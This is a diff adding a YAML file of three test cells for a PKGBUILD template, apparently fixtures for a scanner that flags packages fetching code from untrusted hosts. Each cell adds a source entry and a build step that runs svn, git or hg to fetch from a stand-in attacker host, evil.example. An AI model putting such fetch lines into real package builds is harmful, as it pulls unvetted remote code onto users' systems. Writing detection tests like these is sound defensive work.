@@ -1,0 +1,20 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    p1: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" "repo::https://evil.example/svn/repo")
+    p2: |2
+        svn co https://evil.example/svn/repo
+  id: 01-svn-implicit2
+- vars:
+    p1: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" "repo::https://evil.example/repo.git")
+    p2: |2
+        git clone --depth 1 https://evil.example/repo.git
+  id: 02-gitclone-implicit2
+- vars:
+    p1: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" "repo::https://evil.example/hg/repo")
+    p2: |2
+        hg clone https://evil.example/hg/repo
+  id: 03-hg-implicit2
